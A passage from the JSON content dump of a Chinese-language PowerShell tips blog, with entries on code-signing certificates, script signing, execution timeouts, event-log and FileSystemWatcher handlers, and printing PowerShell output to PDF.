}} 以下是如何以 pfx 文件的形式创建代码签名证书的方法： 1PS&gt; New-CodeSigningCert -FriendlyName 'Tobias Code-Signing Test Cert' -Name TobiasCS -FilePath &quot;$home\\desktop\\myCert.pfx&quot; 您将会收到提示，要求输入用来保护 pfx 文件的密码。请记住该密码，一会儿导入 pfx 文件的时候需要该密码。 以下是如何在个人证书存储中创建代码签名证书的方法： 1PS&gt; New-CodeSigningCert -FriendlyName 'Tobias Code-Signing Test Cert' -Name TobiasCS -Trusted 调用这个函数之后，您的证书现在位于 cert: 驱动器中，您现在可以像这样查看它： 1PS C:\\&gt; dir Cert:\\CurrentUser\\my 同样地，您可以打开个人证书存储来管理它： 1PS C:\\&gt; certmgr.msc 请继续关注后续的技能，来学习现在能对代码签名证书做哪些事！ 请注意自签名证书仅在复制到受信任的根证书发布者容器之后才能被信任。当使用 -Trusted 开关参数之后，会自动应用以上操作。","link":"/2018/11/28/code-signing-mini-series-part-1-creating-certs/"},{"title":"PowerShell 技能连载 - 代码签名迷你系列（第 2 部分：从 PFX 文件读取证书）","text":"在前一个技能中我们创建了新的代码签名测试证书，它既是一个 pfx 文件，同时也位于您的证书存储中。今天，我们将看看如何在 PowerShell 中加载这些（或来自其它来源的任意其它证书）。 要从 pfx 文件加载证书，请使用 Get-PfxCertificate： 1234$Path = &quot;$home\\desktop\\tobias.pfx&quot;$cert = Get-PfxCertificate -FilePath $Path$cert | Select-Object -Property * Get-PfxCertificate 将提醒输入 pfx 文件创建时输入的密码。有一些 pfx 文件并没有使用密码保护或者是通过您的用户账户来保护证书，这些情况下不会显示提示。 如果您需要自动读取 pfx 证书，以下是一个通过参数输入密码，并且可以无人值守地从 pfx 文件读取证书： 12345678910111213141516171819202122function Load-PfxCertificate{ param ( [String] [Parameter(Mandatory)] $FilePath, [SecureString] [Parameter(Mandatory)] $Password ) # get clear text password $plaintextPassword = [PSCredential]::new(&quot;X&quot;, $Password).GetNetworkCredential().Password [void][System.Reflection.Assembly]::LoadWithPartialName(&quot;System.Security&quot;) $container = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2Collection $container.Import($FilePath, $plaintextPassword, 'PersistKeySet') $container[0]} 以下是这个函数工作的方式： 123456789PS C:\\&gt; $pwd = 'secret' | ConvertTo-SecureString -AsPlainText -ForcePS C:\\&gt; $path = &quot;$home\\desktop\\tobias.pfx&quot;PS C:\\&gt; $cert = Load-PfxCertificate -FilePath $path -Password $pwdPS C:\\&gt; $certThumbprint Subject---------- -------322CA0B1F37F43B26D4D8DE17DCBF3E2C17CE111 CN=Tobias 修改 Load-PfxCertificate 的最后一行，可以支持多于一个证书。改函数永远返回第一个证书 ($container[0])，但是可以选择任意另一个下标。 请关注下一个技能，学习如何存取您个人证书存储中的证书。","link":"/2018/11/29/code-signing-mini-series-part-2-reading-certificates-from-pfx-files/"},{"title":"PowerShell 技能连载 - 代码签名迷你系列（第 3 部分：从个人存储中读取证书）","text":"可以通过加载至 Windows 证书存储的方式永久地安装证书。PowerShell 可以通过 cert: 驱动器存取这个存储。以下这行代码将显示所有个人证书： 12345678910PS C:\\&gt; Get-ChildItem -Path Cert:\\CurrentUser\\my PSParentPath: Microsoft.PowerShell.Security\\Certificate::CurrentUser\\myThumbprint Subject---------- -------9F2F02100F6AE1DA83628906D60267F89377A6B2 CN=König von Timbuktu (Ost)65C5ED677C9EEE9AB8D8F55354E920313FE427C2 CN=UniYork IT Security322CA0B1F37F43B26D4D8DE17DCBF3E2C17CE111 CN=Tobias 请注意：如果您的个人证书存储是空的，您可能需要查看这个系列之前的文章来创建一些测试证书。 要只查看代码签名证书，请添加 -CodeSigningCert 动态参数。这将排除所有其它用途的证书以及没有私钥的证书： 1PS C:\\&gt; Get-ChildItem -Path Cert:\\CurrentUser\\my -CodeSigningCert 证书是以它们唯一的指纹 ID 标识，它就像文件的名字一样： 12345678910111213141516171819202122PS C:\\&gt; Get-ChildItem -Path Cert:\\CurrentUser\\my PSParentPath: Microsoft.PowerShell.Security\\Certificate::CurrentUser\\myThumbprint Subject---------- -------9F2F02100F6AE1DA83628906D60267F89377A6B2 CN=King of Timbuktu (Eastside)65C5ED677C9EEE9AB8D8F55354E920313FE427C2 CN=UniYork IT Security322CA0B1F37F43B26D4D8DE17DCBF3E2C17CE111 CN=TobiasPS C:\\&gt; $cert = Get-Item -Path Cert:\\CurrentUser\\My\\9F2F02100F6AE1DA83628906D60267F89377A6B2PS C:\\&gt; $cert PSParentPath: Microsoft.PowerShell.Security\\Certificate::CurrentUser\\MyThumbprint Subject---------- -------9F2F02100F6AE1DA83628906D60267F89377A6B2 CN=King of Timbuktu (Eastside) 如果还不知道唯一的指纹 ID，您需要先找出它，因为这个 ID 能够唯一确认证书。一个查找的方法是按其它属性过滤，例如 subject： 12345678PS C:\\&gt; dir Cert:\\CurrentUser\\my | where subject -like *tobias* PSParentPath: Microsoft.PowerShell.Security\\Certificate::CurrentUser\\myThumbprint Subject---------- -------322CA0B1F37F43B26D4D8DE17DCBF3E2C17CE111 CN=Tobias 在本迷你系列的第一部分，已经介绍了如何用 PowerShell 创建新的证书。 现在您已经学习了如何从 pfx 文件和个人证书存储中读取已有的证书。 请关注下一个技能来学习如何使用证书来实际签名 PowerShell 代码！","link":"/2018/11/30/code-signing-mini-series-part-3-reading-certificates-from-personal-store/"},{"title":"PowerShell 技能连载 - 代码签名迷你系列（第 4 部分：签名 PowerShell 文件）","text":"在将 PowerShell 脚本发送给别人之前，最好对它进行数字签名。签名的角色类似脚本的“包装器”，可以帮助别人确认是谁编写了这个脚本以及这个脚本是否仍是原始本版本，或是已被篡改过。 要对 PowerShell 脚本签名，您需要一个数字代码签名证书。在前一个技能中我们解释了如何创建一个该证书，并且/或者从 pfx 或证书存储中加载该证书。以下代码假设在 $cert 中已经有了一个合法的代码签名证书。如果还没有，请先阅读之前的技能文章！ 12345678910111213# make sure this PFX file exists or create one# or load a code-signing cert from other sources# (review the previous tips for hints)$pfxFile = &quot;$home\\desktop\\tobias.pfx&quot;$cert = Get-PfxCertificate -FilePath $pfxFile# make sure this folder exists and contains# PowerShell script that you'd like to sign$PathWithScripts = 'c:\\myScripts'# apply signatures to all scripts in the folderGet-ChildItem -Path $PathWithScripts -Filter *.ps1 -Recurse | Set-AuthenticodeSignature -Certificate $cert 运行这段代码后，指定目录中的所有脚本都会添加上数字签名。如果您连接到了 Internet，应该考虑签名时使用时间戳服务器，并且将最后一行代码替换成这行： 123# apply signatures to all scripts in the folderGet-ChildItem -Path $PathWithScripts -Filter *.ps1 -Recurse | Set-AuthenticodeSignature -Certificate $cert -TimestampServer http://timestamp.digicert.com 使用时间戳服务器会减慢签名的速度但是确保不会用过期的证书签名：例如当某天一本证书过期了，但是签名仍然有效。因为官方的时间戳服务器，签名仍然有效，因为官方的时间戳服务器证明该签名是在证书过期之前应用的。","link":"/2018/12/03/code-signing-mini-series-part-4-code-signing-powershell-files/"},{"title":"PowerShell 技能连载 - 代码签名迷你系列（第 5 部分：审计签名）","text":"当 Powershell 脚本携带一个数字签名后，您可以快速地找出是谁对这个脚本签的名，更重要的是，这个脚本是否未被篡改。在本系列之前的部分中，您学习了如何创建数字签名，以及如何对 PowerShell 文件签名。现在我们来看看如何验证脚本的合法性。 12345# this is the path to the scripts you'd like to examine$Path = &quot;$home\\Documents&quot;Get-ChildItem -Path $Path -Filter *.ps1 -Recurse | Get-AuthenticodeSignature 只需要调整路径，该脚本讲查找该路径下的所有 PowerShell 脚本，然后检查它们的签名。结果有如下可能性： NotSigned: 没有签名 UnknownError: 使用非受信的证书签名 HashMismatch: 签名之后修改过 Valid: 采用受信任的证书签名，并且没有改动过","link":"/2018/12/04/code-signing-mini-series-part-5-auditing-signatures/"},{"title":"PowerShell 技能连载 - 为代码执行添加超时（第 1 部分）","text":"如果希望某些代码不会无限执行下去，您可以使用后台任务来实现超时机制。以下是一个示例函数： 1234567891011121314151617181920212223242526function Invoke-CodeWithTimeout{ param ( [Parameter(Mandatory)] [ScriptBlock] $Code, [int] $Timeout = 5 ) $j = Start-Job -ScriptBlock $Code $completed = Wait-Job $j -Timeout $Timeout if ($completed -eq $null) { throw &quot;Job timed out.&quot; Stop-Job -Job $j } else { Receive-Job -Job $j } Remove-Job -Job $j} 所以基本上说，要让代码执行的时间不超过 5 秒，请试试以下代码： 123456789101112PS&gt; Invoke-CodeWithTimeout -Code { Start-Sleep -Seconds 6; Get-Date } -Timeout 5Job timed out.At line:18 char:7+ throw &quot;Job timed out.&quot;+ ~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : OperationStopped: (Job timed out.:String) [], RuntimeException + FullyQualifiedErrorId : Job timed out.PS&gt; Invoke-CodeWithTimeout -Code { Start-Sleep -Seconds 3; Get-Date } -Timeout 5Thursday November 1, 2018 14:53:26 该方法有效。但是，它所使用的作业相关的开销相当大。创建后台作业并将数据返回到前台任务的开销可能增加了额外的时间。所以我们将在明天的技能中寻求一个更好的方法。","link":"/2018/12/05/executing-code-with-a-timeout-part-1/"},{"title":"PowerShell 技能连载 - 为代码执行添加超时（第 2 部分）","text":"在前一个技能中我们通过 PowerShell 后台作业实现了超时机制，这样您可以设置某段代码执行的最大允许时间，超过该时间将抛出一个异常。 以下是一个更轻量级的替代，它使用进程内线程，而不是进程外执行： 1234567891011121314151617181920212223242526272829303132function Invoke-CodeWithTimeout{ param ( [Parameter(Mandatory)] [ScriptBlock] $Code, [int] $Timeout = 5 ) $ps = [PowerShell]::Create() $null = $ps.AddScript($Code) $handle = $ps.BeginInvoke() $start = Get-Date do { $timeConsumed = (Get-Date) - $start if ($timeConsumed.TotalSeconds -ge $Timeout) { $ps.Stop() $ps.Dispose() throw &quot;Job timed out.&quot; } Start-Sleep -Milliseconds 300 } until ($handle.isCompleted) $ps.EndInvoke($handle) $ps.Runspace.Close() $ps.Dispose()} 以下是使用该新超时机制的方法： 123456789101112PS&gt; Invoke-CodeWithTimeout -Code { Start-Sleep -Seconds 6; Get-Date } -Timeout 5Job timed out.At line:24 char:13+ throw &quot;Job timed out.&quot;+ ~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : OperationStopped: (Job timed out.:String) [], RuntimeException + FullyQualifiedErrorId : Job timed out.PS&gt; Invoke-CodeWithTimeout -Code { Start-Sleep -Seconds 3; Get-Date } -Timeout 5Thursday November 1, 2018 14:53:26","link":"/2018/12/06/executing-code-with-a-timeout-part-2/"},{"title":"PowerShell 技能连载 - 查找打开的防火墙端口","text":"以下是一段连接到本地防火墙并转储所有打开的防火墙端口的 PowerShell 代码： 123$firewall = New-object -ComObject HNetCfg.FwPolicy2$firewall.Rules | Where-Object {$_.Action -eq 0} | Select-Object Name, ApplicationName,LocalPorts 结果看起来类似这样： Name ApplicationName LocalPorts ---- --------------- ---------- pluginhost.exe C:\\users\\tobwe\\appdata\\local\\skypeplugin\\pluginhost.exe * pluginhost.exe C:\\users\\tobwe\\appdata\\local\\skypeplugin\\pluginhost.exe * spotify.exe C:\\users\\tobwe\\appdata\\roaming\\spotify\\spotify.exe * spotify.exe C:\\users\\tobwe\\appdata\\roaming\\spotify\\spotify.exe * 在 Windows 10 和 Server 2016 中，有一系列现成的跟防火墙有关的 cmdlet： 12345678910111213141516171819202122232425262728293031PS&gt; Get-Command -Noun *Firewall*CommandType Name Version Source----------- ---- ------- ------Function Copy-NetFirewallRule 2.0.0.0 NetSecurityFunction Disable-NetFirewallRule 2.0.0.0 NetSecurityFunction Enable-NetFirewallRule 2.0.0.0 NetSecurityFunction Get-NetFirewallAddressFilter 2.0.0.0 NetSecurityFunction Get-NetFirewallApplicationFilter 2.0.0.0 NetSecurityFunction Get-NetFirewallInterfaceFilter 2.0.0.0 NetSecurityFunction Get-NetFirewallInterfaceTypeFilter 2.0.0.0 NetSecurityFunction Get-NetFirewallPortFilter 2.0.0.0 NetSecurityFunction Get-NetFirewallProfile 2.0.0.0 NetSecurityFunction Get-NetFirewallRule 2.0.0.0 NetSecurityFunction Get-NetFirewallSecurityFilter 2.0.0.0 NetSecurityFunction Get-NetFirewallServiceFilter 2.0.0.0 NetSecurityFunction Get-NetFirewallSetting 2.0.0.0 NetSecurityFunction New-NetFirewallRule 2.0.0.0 NetSecurityFunction Remove-NetFirewallRule 2.0.0.0 NetSecurityFunction Rename-NetFirewallRule 2.0.0.0 NetSecurityFunction Set-NetFirewallAddressFilter 2.0.0.0 NetSecurityFunction Set-NetFirewallApplicationFilter 2.0.0.0 NetSecurityFunction Set-NetFirewallInterfaceFilter 2.0.0.0 NetSecurityFunction Set-NetFirewallInterfaceTypeFilter 2.0.0.0 NetSecurityFunction Set-NetFirewallPortFilter 2.0.0.0 NetSecurityFunction Set-NetFirewallProfile 2.0.0.0 NetSecurityFunction Set-NetFirewallRule 2.0.0.0 NetSecurityFunction Set-NetFirewallSecurityFilter 2.0.0.0 NetSecurityFunction Set-NetFirewallServiceFilter 2.0.0.0 NetSecurityFunction Set-NetFirewallSetting 2.0.0.0 NetSecurityFunction Show-NetFirewallRule 2.0.0.0 NetSecurity","link":"/2018/12/07/finding-open-firewall-ports/"},{"title":"PowerShell 技能连载 - 使用 $MyInvocation 的固定替代方式","text":"类似 $MyInvocation.MyCommand.Definition 的代码对于确定当前脚本存储的位置十分有用，例如需要存取同一个文件夹下其它资源的时候。 然而，从 PowerShell 3 开始，有一个更简单的替代方式可以查找当前脚本的名称和/或当前脚本文件夹的路径。请自己运行以下代码测试： 12345$MyInvocation.MyCommand.Definition$PSCommandPathSplit-Path -Path $MyInvocation.MyCommand.Definition$PSScriptRoot 如果您交互式运行这段代码（或在一个“无标题”脚本中），它们都不会返回任何内容。但是当您将脚本保存后执行，这两行代码将返回脚本的路径，并且后两行代码将返回脚本所在文件夹的路径。 $PSCommandPath 和 $PSScriptRoot 的好处在于它们总是包含相同的信息。相比之下，$MyInvocation 可能会改变，而且当从一个函数中读取这个变量时，它就会发生改变。 12345678910function test{ $MyInvocation.MyCommand.Definition $PSCommandPath Split-Path -Path $MyInvocation.MyCommand.Definition $PSScriptRoot}test 现在，$MyInvocation 变得没有价值，因为它重视返回调用本脚本块的调用者信息。","link":"/2018/12/10/using-solid-alternatives-for-myinvocation/"},{"title":"PowerShell 技能连载 - 使用一个停表","text":"在 PowerShell 中，要测量时间，您可以简单将一个 datetime 值减去另一个 datetime 值： 1234567$Start = Get-Date$null = Read-Host -Prompt &quot;Press ENTER as fast as you can!&quot;$Stop = Get-Date$TimeSpan = $Stop - $Start$TimeSpan.TotalMilliseconds 一个优雅的实现是用停表： 123456$StopWatch = [Diagnostics.Stopwatch]::StartNew()$null = Read-Host -Prompt &quot;Press ENTER as fast as you can!&quot;$StopWatch.Stop()$StopWatch.ElapsedMilliseconds 使用停表的好处是可以暂停和继续。","link":"/2018/12/11/using-a-stop-watch/"},{"title":"PowerShell 技能连载 - 直接存取事件日志","text":"通过 Get-EventLog 命令，您可以轻松地转储任意给定的事件日志内容，然而，如果您希望直接存取某个指定的事件日志，您只能使用 -List 参数来完全转储它们，然后选择其中一个您所关注的： 12$SystemLog = Get-EventLog -List | Where-Object { $_.Log -eq 'System' }$SystemLog 一个更简单的方式是使用强制类型转换，类似这样： 12$systemLogDirect = [System.Diagnostics.EventLog]'System'$systemLogDirect Simply “convert” the event log name into an object of “EventLog” type. The result looks similar to this and provides information about the number of entries and the log file size:只需要将时间日志名称“转换”为一个 “EventLog“ 类型的对象。结果类似这样，并且提供了条目的数量和日志文件尺寸等信息： 12345PS&gt; $systemLogDirect Max(K) Retain OverflowAction Entries Log ------ ------ -------------- ------- --- 20.480 0 OverwriteAsNeeded 19.806 System","link":"/2018/12/12/accessing-event-logs-directly/"},{"title":"PowerShell 技能连载 - 响应新的事件日志条目（第 1 部分）","text":"如果您希望实时处理新的事件日志条目，以下是当新的事件条目写入时，PowerShell 代码能自动收到通知的方法： 12345678910111213141516171819202122# set the event log name you want to subscribe to# (use Get-EventLog -AsString for a list of available event log names)$Name = 'Application'# get an instance$Log = [System.Diagnostics.EventLog]$Name# determine what to do when an event occurs$Action = { # get the original event entry that triggered the event $entry = $event.SourceEventArgs.Entry # do something based on the event if ($entry.EventId -eq 1 -and $entry.Source -eq 'WinLogon') { Write-Host &quot;Test event was received!&quot; }}# subscribe to its &quot;EntryWritten&quot; event$job = Register-ObjectEvent -InputObject $log -EventName EntryWritten -SourceIdentifier 'NewEventHandler' -Action $Action 这段代码片段安装了一个后台的事件监听器，每当事件日志产生一个 “EntryWritten” 事件时会触发。当发生该事件时，$Action 中的代码就会执行。它通过查询 $event 变量获取触发该操作的事件。在我们的示例中，当 EventId 等于 1，并且事件源是 “WinLogon“ 时，会写入一条信息。当然，您可以发送一封邮件，写入一条日志，或做任何其它有用的事情。 要查看事件处理器的效果，只需要写一个符合所有要素的测试事件： 12# write a fake test event to triggerWrite-EventLog -LogName Application -Source WinLogon -EntryType Information -Message test -EventId 1 当您运行这段代码时，事件处理器将自动执行并向控制台输出自己的信息。 请注意这个例子将安装一个异步的处理器，并且当 PowerShell 不忙碌的时候会在后台执行，并且在 PowerShell 运行期间都有效。您不能通过 Start-Sleep 或一个循环来保持 PowerShell 忙碌（因为 PowerShell 会忙碌而无法在后台处理事件处理器）。要保持这个事件处理器可响应，您可以通过 -noexit 参数启动脚本： 1Powershell.exe -noprofile -noexit -file “c:\\yourpath.ps1” 要移除事件处理器，请运行以下代码： 12PS&gt; Unregister-Event -SourceIdentifier NewEventHandlerPS&gt; Remove-Job -Name NewEventHandler","link":"/2018/12/13/responding-to-new-event-log-entries-part-1/"},{"title":"PowerShell 技能连载 - 响应新的事件日志条目（第 2 部分）","text":"以下是另一个文件系统任务，听起来复杂，实际并没有那么复杂。假设您需要移除一个文件夹结构中指定层次之下的所有文件夹。以下是实现方法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# set the event log name you want to subscribe to# (use Get-EventLog -AsString for a list of available event log names)$Name = 'Application'# get an instance$Log = [System.Diagnostics.EventLog]$Name# determine what to do when an event occurs$Action = { # get the original event entry that triggered the event $entry = $event.SourceEventArgs.Entry # log all events Write-Host &quot;Received from $($entry.Source): $($entry.Message)&quot; # do something based on a specific event if ($entry.EventId -eq 1 -and $entry.Source -eq 'WinLogon') { Write-Host &quot;Test event was received!&quot; -ForegroundColor Red }}# subscribe to its &quot;EntryWritten&quot; event$job = Register-ObjectEvent -InputObject $log -EventName EntryWritten -SourceIdentifier 'NewEventHandler' -Action $Action# now whenever an event is written to the log, $Action is executed# use a loop to keep PowerShell busy. You can abort via CTRL+CWrite-Host &quot;Listening to events&quot; -NoNewlinetry{ do { Wait-Event -SourceIdentifier NewEventHandler -Timeout 1 Write-Host &quot;.&quot; -NoNewline } while ($true)}finally{ # this executes when CTRL+C is pressed Unregister-Event -SourceIdentifier NewEventHandler Remove-Job -Name NewEventHandler Write-Host &quot;&quot; Write-Host &quot;Event handler stopped.&quot;} 由于事件处理器是活跃的，PowerShell 每秒输出一个“点”，表示它仍在监听。现在打开另一个 PowerShell 窗口，并且运行以下代码： 1Write-EventLog -LogName Application -Source WinLogon -EntryType Information -Message test -EventId 1 当写入一个新的应用程序事件日志条目时，事件处理器显示事件的详情。如果事件的 EventID 等于 1 并且事件源为 “WinLogon“，例如我们的测试事件条目，那么将会输出一条红色的信息。 要停止事件监听器，请按 CTRL+C。代码将自动清理并从内存中移除事件监听器。 这都是通过 Wait-Event 实现的：这个 cmdlet 可以等待特定的事件发生。并且当它等待时，PowerShell 可以继续执行事件处理器。当您指定一个超时（以秒为单位），该 cmdlet 将控制权返回给脚本。在我们的栗子中，控制权每秒钟都会返回，使脚本有机会以点的方式输出进度指示器。 如果用户按下 CTRL+C，该脚本并不会立即停止。相反，它会先执行 finally 语句块并确保该事件处理器已清除和移除。","link":"/2018/12/14/responding-to-new-event-log-entries-part-2/"},{"title":"PowerShell 技能连载 - 正确使用 FileSystemWatcher（第 1 部分）","text":"FileSystemWatcher 可以监控一个文件或文件夹的改变。当有新文件复制到文件夹，或有文件删除或改变，您的 PowerShell 代码会立刻收到通知。 时常会见到这样的同步监控示例代码： 1234567891011121314151617181920212223242526# make sure you adjust this$PathToMonitor = &quot;c:\\test&quot;$FileSystemWatcher = New-Object System.IO.FileSystemWatcher$FileSystemWatcher.Path = $PathToMonitor$FileSystemWatcher.IncludeSubdirectories = $trueWrite-Host &quot;Monitoring content of $PathToMonitor&quot;explorer $PathToMonitorwhile ($true) { $Change = $FileSystemWatcher.WaitForChanged('All', 1000) if ($Change.TimedOut -eq $false) { # get information about the changes detected Write-Host &quot;Change detected:&quot; $Change | Out-Default # uncomment this to see the issue #Start-Sleep -Seconds 5 } else { Write-Host &quot;.&quot; -NoNewline }} 这个示例可以正常工作。当您向监控的文件夹增加文件，或者作出改变时，将会监测到改变的类型。您可以容易地得到该信息并采取操作。例如，对于 IT 部门，人们可以向一个投放文件夹投放文件和说明，您的脚本可以自动处理这些文件。 然而，这种方式又一个副作用：当监测到一个变更时，控制权返回到您的脚本，这样它可以处理这些变更。如果这时候另一个文件发生改变，而您的脚本并不是正在等待事件，那么将错过这个事件。您可以很容易地自我检查： 向变更发生时的执行代码中添加一些耗时的语句，例如 “Start-Sleep -Seconds 5“，然后对文件夹做多个改变。如您所见，检测到了第一个变更，但是 PowerShell 会持续五分钟忙碌，而其它改变事件都丢失了。 就在明天的技能中我们将确保您的 FileSystemWatcher 不会跳过任何变更！","link":"/2018/12/17/using-filesystemwatcher-correctly-part-1/"},{"title":"PowerShell 技能连载 - 正确使用 FileSystemWatcher（第 2 部分）","text":"在前一个技能中我们介绍了 FileSystemWatcher 并演示了当事件处理代码执行事件过长时会丢失文件系统改变事件。 要正确地使用 FileSystemWatcher，您需要异步地使用它并使用队列。这样即便脚本正忙于处理文件系统变更，也能够继续记录新的文件系统变更，并在一旦 PowerShell 处理完之前的变更时处理新的变更。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081# make sure you adjust this to point to the folder you want to monitor$PathToMonitor = &quot;c:\\test&quot;explorer $PathToMonitor$FileSystemWatcher = New-Object System.IO.FileSystemWatcher$FileSystemWatcher.Path = $PathToMonitor$FileSystemWatcher.IncludeSubdirectories = $true# make sure the watcher emits events$FileSystemWatcher.EnableRaisingEvents = $true# define the code that should execute when a file change is detected$Action = { $details = $event.SourceEventArgs $Name = $details.Name $FullPath = $details.FullPath $OldFullPath = $details.OldFullPath $OldName = $details.OldName $ChangeType = $details.ChangeType $Timestamp = $event.TimeGenerated $text = &quot;{0} was {1} at {2}&quot; -f $FullPath, $ChangeType, $Timestamp Write-Host &quot;&quot; Write-Host $text -ForegroundColor Green # you can also execute code based on change type here switch ($ChangeType) { 'Changed' { &quot;CHANGE&quot; } 'Created' { &quot;CREATED&quot;} 'Deleted' { &quot;DELETED&quot; # uncomment the below to mimick a time intensive handler &lt;# Write-Host &quot;Deletion Handler Start&quot; -ForegroundColor Gray Start-Sleep -Seconds 4 Write-Host &quot;Deletion Handler End&quot; -ForegroundColor Gray #&gt; } 'Renamed' { # this executes only when a file was renamed $text = &quot;File {0} was renamed to {1}&quot; -f $OldName, $Name Write-Host $text -ForegroundColor Yellow } default { Write-Host $_ -ForegroundColor Red -BackgroundColor White } }}# add event handlers$handlers = . { Register-ObjectEvent -InputObject $FileSystemWatcher -EventName Changed -Action $Action -SourceIdentifier FSChange Register-ObjectEvent -InputObject $FileSystemWatcher -EventName Created -Action $Action -SourceIdentifier FSCreate Register-ObjectEvent -InputObject $FileSystemWatcher -EventName Deleted -Action $Action -SourceIdentifier FSDelete Register-ObjectEvent -InputObject $FileSystemWatcher -EventName Renamed -Action $Action -SourceIdentifier FSRename}Write-Host &quot;Watching for changes to $PathToMonitor&quot;try{ do { Wait-Event -Timeout 1 Write-Host &quot;.&quot; -NoNewline } while ($true)}finally{ # this gets executed when user presses CTRL+C # remove the event handlers Unregister-Event -SourceIdentifier FSChange Unregister-Event -SourceIdentifier FSCreate Unregister-Event -SourceIdentifier FSDelete Unregister-Event -SourceIdentifier FSRename # remove background jobs $handlers | Remove-Job # remove filesystemwatcher $FileSystemWatcher.EnableRaisingEvents = $false $FileSystemWatcher.Dispose() &quot;Event Handler disabled.&quot;} 当您运行这段代码时，将监控 $PathToMonitor 中定义的文件夹的改变，并且当变更发生时，会触发一条消息。当您按下 CTRL+C 时，脚本停止执行，并且所有事件处理器将在 finally 代码块中清理。 更重要的是：这段代码内部使用队列，所以当短时间内有大量修改发生时，它们将会等到 PowerShell 不忙碌的时候立即执行。您可以取消代码中的注释来演唱处理时间。现在，当一个文件删除后，处理器需要 4 秒钟的额外处理时间。 即便删除了大量文件，它们最终仍将显示出来。这里展示的方式比起前一个技能中基于 WaitForChanged() 的同步处理器更可靠。","link":"/2018/12/18/using-filesystemwatcher-correctly-part-2/"},{"title":"PowerShell 技能连载 - 在打印机上打印测试页","text":"感谢 PrintManagement 模块为 Windows 10 和 Windows Server 2016 提供了大量的打印功能支持。如果希望打印官方的测试页，您还需要动用 WMI。 123456789101112131415161718#requires -Version 3.0 -Modules CimCmdlets, PrintManagementGet-Printer | Out-GridView -Title 'Print test page on selected printers' -OutputMode Multiple | ForEach-Object { $printerName = $_.Name $result = Get-CimInstance Win32_Printer -Filter &quot;name LIKE '$printerName'&quot; | Invoke-CimMethod -MethodName printtestpage if ($result.ReturnValue -eq 0) { &quot;Test page printed on $printerName.&quot; } else { &quot;Unable to print test page on $printerName.&quot; &quot;Error code $($result.ReturnValue).&quot; } } 当这段代码运行时，将弹出一个对话框显示所有的打印机。请选择一个（或按住 CTRL 选择多个），将在选中的打印机上打印测试页。","link":"/2018/12/19/printing-test-pages-on-printers/"},{"title":"PowerShell 技能连载 - 将 PowerShell 结果发送到 PDF（第 1 部分）","text":"Windows 10 和 Windows Server 2016 终于带来了内置的 PDF 打印机，名为 “Microsoft Print to PDF”。您可以在 PowerShell 中用它来创建 PDF 文件。请运行这段代码来测试您的 PDF 打印机： 123456789$printer = Get-Printer -Name &quot;Microsoft Print to PDF&quot; -ErrorAction SilentlyContinueif (!$?){ Write-Warning &quot;Your PDF Printer is not yet available!&quot;}else{ Write-Warning &quot;PDF printer is ready for use.&quot;} 如果您的打印机不能用（或是暂时不能用），那么您可能使用的不是 Windows 10 或 Windows Server 2016，或者 PDF 打印功能尚未启用。请在管理员权限下运行 PowerShell 并执行这段命令来修复它： 1PS&gt; Enable-WindowsOptionalFeature -Online -FeatureName Printing-PrintToPDFServices-Features 请确保使用管理员权限运行上述代码，您也可以试着使用以下代码： 123$code = 'Enable-WindowsOptionalFeature -Online -FeatureName Printing-PrintToPDFServices-Features'Start-Process -Verb Runas -FilePath powershell.exe -ArgumentList &quot;-noprofile -command $code&quot; 当 PDF 打印机安装好后，从 PowerShell 中创建 PDF 文件十分简单。只需要将输出结果发送到 Out-Printer。以下是一个示例： 1PS&gt; Get-Service | Out-Printer -Name &quot;Microsoft Print to PDF&quot; 打印机驱动将会打开一个对话框，您可以选择输出的文件名。如果不希望显示这个对话框，而以无人值守的方式打印，我们将在明天介绍。","link":"/2018/12/20/sending-powershell-results-to-pdf-part-1/"},{"title":"PowerShell 技能连载 - 将 PowerShell 结果发送到 PDF（第 2 部分）","text":"在前一个示例中我们延时了如何使用内置的 “Microsoft Print to PDF” 打印机来将 PowerShell 输出结果发送到 PDF 文件。然而，这个打印机会提示选择选择输出的文件，所以不适合自动化任务。 要禁止文件提示，有一个很少人知道的秘密：只需要对打印机指定一个端口，端口名就是输出的文件路径。换句话说，运行这段代码可以创建一个新打印机，并打印到您选择的文件中： 123456789101112131415161718192021222324252627282930313233343536373839# requires Windows 10 / Windows Server 2016 or better# choose a name for your new printer$printerName = 'PrintPDFUnattended'# choose a default path where the PDF is saved$PDFFilePath = &quot;$env:temp\\PDFResultFile.pdf&quot;# choose whether you want to print a test page$TestPage = $true# see whether the driver exists$ok = @(Get-PrinterDriver -Name &quot;Microsoft Print to PDF&quot; -ea 0).Count -gt 0if (!$ok){ Write-Warning &quot;Printer driver 'Microsoft Print to PDF' not available.&quot; Write-Warning &quot;This driver ships with Windows 10 or Windows Server 2016.&quot; Write-Warning &quot;If it is still not available, enable the 'Printing-PrintToPDFServices-Features'&quot; Write-Warning &quot;Example: Enable-WindowsOptionalFeature -Online -FeatureName Printing-PrintToPDFServices-Features&quot; return}# check whether port exists$port = Get-PrinterPort -Name $PDFFilePath -ErrorAction SilentlyContinueif ($port -eq $null){ # create printer port Add-PrinterPort -Name $PDFFilePath}# add printerAdd-Printer -DriverName &quot;Microsoft Print to PDF&quot; -Name $printerName -PortName $PDFFilePath# print a test page to the printerif ($TestPage){ $printerObject = Get-CimInstance Win32_Printer -Filter &quot;name LIKE '$printerName'&quot; $null = $printerObject | Invoke-CimMethod -MethodName printtestpage Start-Sleep -Seconds 1 Invoke-Item -Path $PDFFilePath} 当这段脚本执行以后，可以获得一个全新的名为 PrintPDFUnattended 的打印机。并且当打印到该打印机不会产生提示，而是永远输出到临时文件夹的 PDFResultFile.pdf。 以下是一段演示如何从 PowerShell 打印 PDF 文件而不产生对话框的方法： 123456789101112131415161718192021222324252627282930313233343536373839# specify the path to the file you want to create# (adjust if you want)$OutPath = &quot;$home\\desktop\\result.pdf&quot;# this is the file the print driver always prints to$TempPDF = &quot;$env:temp\\PDFResultFile.pdf&quot;# make sure old print results are removed$exists = Test-Path -Path $TempPDFif ($exists) { Remove-Item -Path $TempPDF -Force }# send PowerShell results to PDFGet-Service | Out-Printer -Name &quot;PrintPDFUnattended&quot;# wait for the print job to be completed, then move file$ok = $falsedo { Start-Sleep -Milliseconds 500 Write-Host '.' -NoNewline $fileExists = Test-Path -Path $TempPDF if ($fileExists) { try { Move-Item -Path $TempPDF -Destination $OutPath 